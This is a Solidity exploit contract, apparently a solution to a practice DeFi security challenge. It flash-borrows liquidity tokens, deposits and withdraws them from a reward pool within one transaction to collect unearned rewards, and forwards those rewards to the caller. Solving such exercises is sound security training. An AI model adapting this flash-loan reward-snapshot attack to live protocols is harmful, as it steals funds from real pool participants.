// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract TheRewarderAttack {
    TheRewarderPool public theRewarderPool;
    FlashLoanerPool public flashLoanerPool;

    constructor(address theRewarderPoolAddress, address flashLoanerPoolAddress) {
        theRewarderPool = TheRewarderPool(theRewarderPoolAddress);
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
    }

    function receiveFlashLoan(uint256 amount) external {
        ERC20(theRewarderPool.liquidityToken()).approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        SafeTransferLib.safeTransfer(address(theRewarderPool.liquidityToken()), address(flashLoanerPool), amount);
    }

    function attack() external {
        flashLoanerPool.flashLoan(1e6 * 1e18);
        address token = address(theRewarderPool.rewardToken());
        uint256 amount = ERC20(token).balanceOf(address(this));
        SafeTransferLib.safeTransfer(token, msg.sender, amount);
    }
}
